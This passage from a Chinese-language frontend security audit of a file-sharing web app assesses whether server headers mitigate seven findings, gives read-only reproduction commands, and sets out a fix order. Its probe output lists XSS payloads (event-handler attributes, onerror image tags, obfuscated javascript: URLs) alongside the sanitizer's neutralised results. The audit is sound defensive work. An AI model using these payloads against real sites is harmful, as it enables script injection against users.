6. **OOXML 只用自研解析器、不用 DOMParser**：换来 Node 可测 + 无 XXE，代价是"不校验良构性"（`xml.ts:11-12` 有意为之：预览优先于报错）。F-3 是这份取舍的直接成本。
7. **`GET /login?next=` 被忽略**（`share-page.tsx:202` 会拼 `next`，但 `login-page.tsx:30,40,99` 一律 `navigate("/")`）——**这不是漏洞，反而是把开放重定向的入口关掉了**。如果以后要支持 `next`，必须只允许站内相对路径。

---

## 七、对"服务端头是否能缓解"的明确判断

| 前端问题 | 服务端头能否缓解 | 结论 |
|---|---|---|
| F-1 WebMCP | ❌ 不能。工具最终走合法 `/api`，服务端看到的是"用户本人发起的请求" | 只能前端加同意门 |
| F-2 插件导航带出 | ⚠️ 现有 CSP 缓解不了（导航不是 fetch 指令）；只能靠 `frame-src`/文档绑定/`load` 检测 | 需要前后端配合 |
| F-3 Office DoS | ❌ 不能（解析在浏览器里） | 前端加节点/幻灯片上限 |
| F-4 票据入 URL | ⚠️ `Referrer-Policy: no-referrer` 已挡掉 Referer 泄露；应用自身日志只打 `req.path` 不打 query；**但反向代理/隧道日志仍会记录** | 改进：票据换 Cookie/头 |
| F-5 xlsx 颜色 | ❌ 不相关 | 前端加字符校验 |
| F-6 Vite dev | ❌ 不相关（dev server 不经 express） | 改 `host` |
| F-7 旧内容残留 | ❌ 不相关 | 前端 `setText(null)` |

---

## 八、复现（可机械验证，全部只读）

```powershell
cd "D:\编程\Wangyq EPan 网盘\EPan"

# 1) 项目自带的白名单单测（28 项，全部通过）
node --experimental-strip-types scripts/markdown-html-test.mjs

# 2) 本次审计新增的探针：10 组 HTML payload + 16 组 URL payload
#    （只 import 纯函数模块，不碰源码、不联网）
node --experimental-strip-types .audit/payload-probe.mjs
```

探针输出要点（原样摘录）：

```
"<span onmouseover=\"alert(1)\">x</span>"      -> "<span>x</span>"
"<span/title=\"a\">"                            -> "&lt;span/title=&quot;a&quot;&gt;"
"<center><script>alert(1)</script></center>"    -> "<center>&lt;script&gt;alert(1)&lt;/script&gt;</center>"
"<span title=\"&quot;><img src=x onerror=alert(1)>\">x</span>"
                                                -> "<span>&lt;img src=x onerror=alert(1)&gt;&quot;&gt;x</span>"
"\u0001javascript:alert(1)"   BAD_URL=false external=false path="dir/sub/\u0001javascript:alert(1)"
"javascript\t:alert(1)"       BAD_URL=false external=false path="dir/sub/javascript\t:alert(1)"
"%6a%61vascript:alert(1)"     BAD_URL=false external=false path="dir/sub/%6a%61vascript:alert(1)"
```

即：**所有白名单标签的属性都被丢弃；所有绕过 `BAD_URL` 的变体都进不了 `href`**（它们走"相对路径 → `encodeURIComponent` → `?path=`"这条分支）。

> 审计遗留物：`.audit/payload-probe.mjs`（本次新增，仅探针，不参与构建）。如不需要可删。

---

## 九、建议的处理顺序

1. **F-1**（中）：给 WebMCP 加开关 + 写/分享类工具逐个确认。改动小、收益最大，且是**已经过两轮报告仍未处理**的一项。
2. **F-2**（中）：插件消息绑定 nonce + 二次 `load` 即断连；同步修正注释里"零网络"的表述，避免下一轮评审继续被这句话误导。
3. **F-3**（中低）：`parseXml` 节点预算 + `parsePptx` 幻灯片上限/去重。三行代码级别，堵掉 D-2 的同类残留。
4. **F-4 / F-5 / F-6 / F-7**（低）：票据出 URL、颜色字符校验、dev host、`setText(null)`。
5. **D-7**（可接受）：在 CI 里对 `web/public/resources/{lucide,gsap}.min.js` 加 hash 校验，或改用 npm 依赖交给打包器。
